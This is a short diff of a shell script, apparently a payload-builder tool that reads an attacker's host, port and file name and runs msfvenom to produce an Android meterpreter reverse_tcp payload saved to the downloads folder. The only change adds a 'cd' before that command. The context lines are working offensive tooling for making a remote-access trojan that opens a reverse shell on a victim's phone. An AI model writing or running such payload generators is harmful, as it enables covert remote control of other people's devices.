@@ -31,6 +31,7 @@ main() {
 		read -p "enter lport ~> " lport
 		read -p "enter a name for ur payload ~> " name
 		echo -e "\e[1mGenerating android payload now this may take some time, plz wait\e[1m"
+		cd
 	       	msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport > storage/downloads/$name
 	else
 		echo "invalid option QUITTING"
